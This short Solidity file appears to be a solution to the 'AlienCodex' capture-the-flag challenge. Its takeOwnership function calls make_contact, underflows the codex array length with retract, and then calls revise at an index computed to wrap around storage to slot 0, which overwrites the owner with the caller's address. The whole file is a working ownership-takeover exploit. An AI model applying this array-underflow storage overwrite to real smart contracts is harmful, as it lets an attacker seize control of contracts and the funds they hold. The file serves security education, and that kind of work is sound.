// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import './AlienCodex.sol';

contract AlienCodexSolution {
  AlienCodex public alienCodex;

  constructor(address _alienCodex) public {
    alienCodex = AlienCodex(_alienCodex);
  }

  function takeOwnership() external {
    bytes32 arrayPositionHash = keccak256(abi.encode(uint(0x01)));
    uint256 max = 2 ** 256 - 1;
    uint256 untilMax = max - uint256(arrayPositionHash);
  
    alienCodex.make_contact();

    bytes32 addrAsBytes = bytes32(uint256(uint160(msg.sender)));
    uint256 contact = 1;
    bytes32 contactAsBytes = bytes32(contact) << 160;
    bytes32 data = addrAsBytes | contactAsBytes;

    alienCodex.retract(); // length from 0 to fff to prevent out of bounds call
    alienCodex.revise(untilMax + 1, data);
  }
}